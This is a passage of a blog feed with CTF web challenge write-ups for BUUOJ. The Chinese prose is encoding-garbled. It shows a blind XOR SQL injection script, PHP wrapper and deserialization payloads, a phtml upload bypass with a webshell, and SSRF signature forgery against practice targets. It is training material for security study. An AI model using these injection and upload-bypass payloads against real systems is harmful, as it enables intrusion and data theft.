title="0X09ï¼š[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢"></a>0X09ï¼š[WUSTCTF2020]é¢œå€¼æˆç»©æŸ¥è¯¢</h4><p>ç›²æ³¨ï¼Œç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://7e100a65-2a28-4468-bd32-37a4f7d7bf17.node3.buuoj.cn/?stunum=1"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    mid = left + ((right - left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload = "^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),&#123;&#125;,1))&gt;&#123;&#125;)".format(i,mid)</span></span><br><span class="line">        payload = <span class="string">"^(ascii(substr((select(value)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">            print(<span class="string">'too fast'</span>)</span><br><span class="line">            time.sleep(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hi admin, your score is: 100'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">'Hi admin, your score is: 100'</span>  <span class="keyword">in</span> r.text:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = left + ((right-left)&gt;&gt;<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">31</span> <span class="keyword">or</span> mid == <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += chr(mid)</span><br><span class="line">    print(str(mid),res)</span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œæ¯æ¬¡å‡ºæ¥çš„flagéƒ½ä¸ä¸€æ ·ï¼Œå…ˆæ”¾ç€äº†ï¼Œæ€è·¯æ²¡é—®é¢˜ï¼Œç”¨å¼‚æˆ–æ³¨å…¥</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0X01ï¼š-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz&quot;&gt;&lt;a href=&quot;#0X01ï¼š-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz&quot; class=&quot;headerlink&quot; title=&quot;0X01ï¼š[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz&quot;&gt;&lt;/a&gt;0X01ï¼š[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz
    
    </summary>
    
    
    
      <category term="buu" scheme="http://yoursite.com/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>buuoj2</title>
    <link href="http://yoursite.com/2020/05/11/buuoj2/"/>
    <id>http://yoursite.com/2020/05/11/buuoj2/</id>
    <published>2020-05-11T15:08:46.000Z</published>
    <updated>2020-05-17T06:23:13.755Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01-ZJCTF-2019-NiZhuanSiWei"><a href="#0X01-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="0X01:[ZJCTF 2019]NiZhuanSiWei"></a>0X01:[ZJCTF 2019]NiZhuanSiWei<a id="more"></a></h4><p>ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>pass1:</p><p>ç”¨dataåè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/1.png" class="" title="examplename"><p>pass2ï¼š</p><p>ç”¨filteråè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°base64åŠ å¯†çš„æºç ï¼Œè§£å¯†ï¼Œæ˜¯ä¸ªç®€å•çš„åºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a=<span class="keyword">new</span> Flag();</span><br><span class="line">$a-&gt;file=<span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);<span class="comment">//è®©file=flag.phpå³å¯</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆpayload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:&#123;s:4:"file";s:8:"flag.php";&#125;</span></span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/2.png" class="" title="examplename"><h4 id="0X02-ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#0X02-ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="0X02:[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>0X02:[ACTF2020 æ–°ç”Ÿèµ›]Include</h4><p>æ‰“å¼€é¢˜ç›®ï¼Œæœ‰ä¸€ä¸ªè·³è½¬é“¾æ¥ï¼Œç‚¹å‡»</p><img src="/2020/05/11/buuoj2/4.png" class="" title="examplename"><p>ç›´æ¥ç”¨filterè¯»å–flag.php</p><img src="/2020/05/11/buuoj2/3.png" class="" title="examplename"><p>base64è§£å¯†å°±èƒ½æ‹¿åˆ°flag</p><h4 id="0X03-ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#0X03-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="0X03:[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>0X03:[ACTF2020 æ–°ç”Ÿèµ›]Upload</h4><p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œæœ‰jså‰ç«¯éªŒè¯ï¼Œç›´æ¥å»æ‰</p><p>ä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œæç¤ºåªèƒ½ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶</p><p>å°è¯•åç¼€ç»•è¿‡ï¼ŒphtmlæˆåŠŸä¸Šä¼ ï¼Œè¿ä¸Šèšå‰‘ï¼Œæ‹¿åˆ°flag</p><img src="/2020/05/11/buuoj2/5.png" class="" title="examplename"><p>ä»æ‹¿åˆ°çš„æºç å¯ä»¥çœ‹åˆ°è€ƒç‚¹å°±æ˜¯phtml</p><h4 id="0X04-De1CTF-2019-SSRF-Me"><a href="#0X04-De1CTF-2019-SSRF-Me" class="headerlink" title="0X04:[De1CTF 2019]SSRF Me"></a>0X04:[De1CTF 2019]SSRF Me</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>åœ¨/De1taé¡µé¢æˆ‘ä»¬getæ–¹æ³•ä¼ å…¥paramå‚æ•°å€¼ï¼Œåœ¨cookieé‡Œé¢ä¼ é€’actionå’Œsignçš„å€¼,å°†ä¼ é€’çš„paramé€šè¿‡wafè¿™ä¸ªå‡½æ•°,wafå‡½æ•°è¿‡æ»¤äº†ä»¥fileå’Œgopherå¼€å¤´çš„ï¼Œä¼ å‚æ„é€ Taskç±»ï¼Œè°ƒç”¨execæ–¹æ³•ï¼ŒcheckSignéªŒè¯ç™»å½•</p><img src="/2020/05/11/buuoj2/6.png" class="" title="examplename"><p>ä¸Šé¢çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œaction=readscanæˆ–è€…scanread</p><img src="/2020/05/11/buuoj2/8.png" class="" title="examplename"><p>å½“æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°actionå’Œparamç»è¿‡getSignè¿™ä¸ªå‡½æ•°ä¹‹åä¸signç›¸ç­‰ï¼Œå°±è¿”å›true</p><p>è¿”å›trueä¹‹ååˆ™è¿›å…¥ifè¯­å¥é‡Œé¢</p><img src="/2020/05/11/buuoj2/7.png" class="" title="examplename"><p>éœ€è¦secert_key+param+actionä¸‰ä¸ªå­—ç¬¦ä¸²è¿æ¥èµ·æ¥ä¹‹åè¿›è¡Œmd5åŠ å¯†ä½œä¸ºè¿”å›å€¼</p><p>è°ƒç”¨geneSignè·¯ç”±å¯ä»¥æ‹¿åˆ°secret_keyï¼Œå†ç»™paramä¼ å€¼ï¼Œparam=flag.txtread,å¾—åˆ°éœ€è¦çš„MD5å€¼</p><img src="/2020/05/11/buuoj2/10.png" class="" title="examplename"><h4 id="0X05-ASIS-2019-Unicorn-shop"><a href="#0X05-ASIS-2019-Unicorn-shop" class="headerlink" title="0X05:[ASIS 2019]Unicorn shop"></a>0X05:[ASIS 2019]Unicorn shop</h4><p>æ‰“å¼€æ˜¯ä¸€ä¸ªè´­ä¹°ç•Œé¢ï¼Œæœ‰å››ç§å•†å“ï¼Œéšä¾¿é€‰ä¸€ä¸ªï¼Œè¾“å…¥ä»·æ ¼</p><img src="/2020/05/11/buuoj2/12.png" class="" title="examplename"><p>åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œçœ‹ä¸€ä¸‹æºç ï¼Œæ‰¾åˆ°äº†ç‚¹æç¤º</p><img src="/2020/05/11/buuoj2/11.png" class="" title="examplename"><p>ç”¨utf-8çš„ç¼–ç æ¥è´­ä¹°ï¼Œä»·æ ¼è¦å¤§äº4å·å•†å“çš„ä»·æ ¼ï¼Œæ‰¾äº†ä¸€ä¸ªç½‘ç«™ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹</p><p><a href="https://www.compart.com/en/unicode/U+2187" target="_blank" rel="noopener">https://www.compart.com/en/unicode/U+2187</a></p><p>æœç´¢ä¸€ä¸‹thousandï¼Œæ‰¾ä¸€ä¸ªå­—ç¬¦ï¼Œä¿®æ”¹0xä¸º%å³å¯</p><img src="/2020/05/11/buuoj2/13.png" class="" title="examplename"><h4 id="0X06-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#0X06-GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="0X06:[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>0X06:[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h4><p>æ‰“å¼€é¢˜ç›®æ²¡ä»€ä¹ˆæç¤ºï¼Œæ‰«æä¸€å‘</p><img src="/2020/05/11/buuoj2/14.png" class="" title="examplename"><p>å‘ç°äº†.gitæ³„éœ²ï¼Œgitæ”»å‡»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpï¼Œè¯´æ˜¯æ— å‚RCEï¼Œå­¦ä¹ ä¸€ä¸‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚</span><br><span class="line">scandir() åˆ—å‡º images ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚</span><br><span class="line">readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line">current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚</span><br><span class="line">pos() current() çš„åˆ«åã€‚</span><br><span class="line">next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</span><br><span class="line">array_reverse()ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚</span><br><span class="line">highlight_file()æ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚</span><br></pre></td></tr></table></figure><img src="/2020/05/11/buuoj2/15.png" class="" title="examplename"><h4 id="0X07-SUCTF-2019-Pythonginx"><a href="#0X07-SUCTF-2019-Pythonginx" class="headerlink" title="0X07:[SUCTF 2019]Pythonginx"></a>0X07:[SUCTF 2019]Pythonginx</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 